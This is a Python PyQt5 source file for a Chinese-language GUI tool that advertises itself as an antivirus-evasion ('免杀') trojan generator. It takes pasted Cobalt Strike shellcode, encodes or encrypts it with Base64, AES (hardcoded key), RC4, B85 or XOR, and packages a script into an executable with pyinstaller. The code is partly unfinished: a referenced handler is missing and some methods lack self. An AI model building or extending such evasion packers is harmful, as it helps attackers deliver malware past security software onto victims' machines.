import base64
import os

from PyQt5 import QtCore, QtWidgets,QtGui
from PyQt5.Qt import *
import subprocess
from encrypt.DoRC4 import *
from encrypt.DoAES import *
from encrypt.DoXor import *

class Ui_widget(object):
    def setupUi(self, widget):
        widget.setObjectName("widget")
        widget.resize(1200, 800)
        self.lineEdit = QtWidgets.QLineEdit(widget)
        self.lineEdit.setGeometry(QtCore.QRect(0, 50, 871, 41))
        self.lineEdit.setObjectName("lineEdit")
        self.comboBox = QtWidgets.QComboBox(widget)
        self.comboBox.setGeometry(QtCore.QRect(900, 50, 151, 41))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("-------------")
        self.comboBox.addItem("Base64")
        self.comboBox.addItem("AES")
        self.comboBox.addItem("RC4")
        self.comboBox.addItem("B85")
        self.comboBox.addItem("Xor")
        self.label = QtWidgets.QLabel(widget)
        self.label.setGeometry(QtCore.QRect(900, 10, 141, 31))
        self.label.setObjectName("label")
        self.pushButton = QtWidgets.QPushButton(widget)
        self.pushButton.setGeometry(QtCore.QRect(1060, 50, 131, 41))
        self.pushButton.setObjectName("pushButton")
        self.line = QtWidgets.QFrame(widget)
        self.line.setGeometry(QtCore.QRect(880, 40, 16, 71))
        self.line.setFrameShape(QtWidgets.QFrame.VLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.line_2 = QtWidgets.QFrame(widget)
        self.line_2.setGeometry(QtCore.QRect(0, 100, 1191, 20))
        self.line_2.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
        self.textBrowser = QtWidgets.QTextBrowser(widget)
        self.textBrowser.setGeometry(QtCore.QRect(0, 120, 1201, 681))
        self.textBrowser.setObjectName("textBrowser")
        self.label_2 = QtWidgets.QLabel(widget)
        self.label_2.setGeometry(QtCore.QRect(10, 20, 311, 18))
        self.label_2.setObjectName("label_2")

        self.comboBox.currentIndexChanged.connect(self.Choice)

        #self.pushButton.clicked.connect(self.Pack)

        self.retranslateUi(widget)
        QtCore.QMetaObject.connectSlotsByName(widget)

    def Pack(self):
        Ui_widget.printf(self, subprocess.getoutput("pyinstaller.exe  result/ma.py --onefile --distpath=result/exe"))
        os.system("rmdir /s /q __pycache__")
        os.system("rmdir /s /q build")
        os.system("del *.spec")


    def Base64_Bypass(message):
        message = base64.b64encode(message)
        return message

    def AES_Bypass(message):
        aes_key = "dfhkAsDFAjDShdfu"
        #message = encrypt.DoAES.encrypt(aes_key, message)
        message = encrypt(aes_key, message)
        return message

    def RC4_Bypass(message):
        message = rc4_main(message)
        return message

    def B85_Bypass(message):
        message = base64.b85encode(message)
        return message

    def Xor_Bypass(message):
        message = XorEncode(message,"aaaaaaaaaa")
        return message

    def outputWritten(self, text):
        cursor = self.textBrowser.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.textBrowser.setTextCursor(cursor)
        self.textBrowser.ensureCursorVisible()

    def printf(self, mes):
        self.textBrowser.append(mes)  # 在指定的区域显示提示信息
        self.cursot = self.textBrowser.textCursor()
        self.textBrowser.moveCursor(self.cursot.End)
        QtWidgets.QApplication.processEvents()

    def show_message(self):
        QMessageBox.information(self, "成功", "生成成功！", QMessageBox.Yes)

    def closeEvent(self, event):
        reply = QMessageBox.question(self, '退出', '确认关闭吗？',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

    def retranslateUi(self, widget):
        _translate = QtCore.QCoreApplication.translate
        widget.setWindowTitle(_translate("widget", "星火免杀tool1.0 by 五十度灰"))
        self.lineEdit.setPlaceholderText(_translate("widget", "cs生成shellcode,去掉/x"))
        self.label.setText(_translate("widget", "选择加密方式"))
        self.pushButton.setText(_translate("widget", "点击生成免杀马"))
        self.textBrowser.setPlaceholderText(_translate("widget", "日志输出"))
        self.label_2.setText(_translate("widget", "输入shellcode"))

